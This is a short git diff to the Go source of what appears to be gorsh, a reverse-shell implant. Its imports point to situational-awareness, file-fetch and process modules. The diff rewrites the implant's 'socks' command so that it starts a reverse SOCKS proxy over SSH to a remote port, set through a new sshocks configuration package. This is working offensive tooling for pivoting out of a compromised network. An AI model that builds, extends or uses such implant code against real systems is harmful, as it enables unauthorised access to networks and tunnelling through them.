@@ -8,12 +8,12 @@ import (
 	"os/exec"
 	"os/user"
 	"path/filepath"
-	"time"
 
 	"github.com/audibleblink/HoleySocks/pkg/holeysocks"
 	"github.com/audibleblink/gorsh/internal/directory"
 	"github.com/audibleblink/gorsh/internal/fetch"
 	"github.com/audibleblink/gorsh/internal/sitrep"
+	"github.com/audibleblink/gorsh/internal/sshocks"
 	"github.com/audibleblink/gorsh/internal/zip"
 	"github.com/shirou/gopsutil/process"
 )
@@ -61,7 +61,7 @@ func init() {
 		&command{
 			Name:     "socks",
 			ArgHint:  "<port>",
-			Desc:     "Create a reverse SOCKS proxy on <port> over ssh",
+			Desc:     "Create a reverse SOCKS proxy on remote <port> over ssh",
 			ArgCount: 1,
 			ArgReq:   true,
 			cmdFn:    socksFn},
@@ -168,24 +168,12 @@ func Route(argv []string) string {
 
 // Command functions
 func socksFn(argv ...string) string {
-	// TODO  Pass channels down to report errors.
-	output := make(chan string)
-	failed := make(chan bool)
-	go func() {
-		err := holeysocks.DarnSocks()
-		if err != nil {
-			failed <- true
-			output <- err.Error()
-		}
-	}()
-
-	time.Sleep(1 * time.Second)
-	select {
-	case <-failed:
-		return <-output
-	default:
-		return "Server started"
+	sshocks.Config.Socks.Remote = fmt.Sprintf("127.0.0.1:%s", argv[1])
+	err := holeysocks.DarnSocks(sshocks.Config)
+	if err != nil {
+		return err.Error()
 	}
+	return "Started"
 }
 
 func cdFn(argv ...string) string {
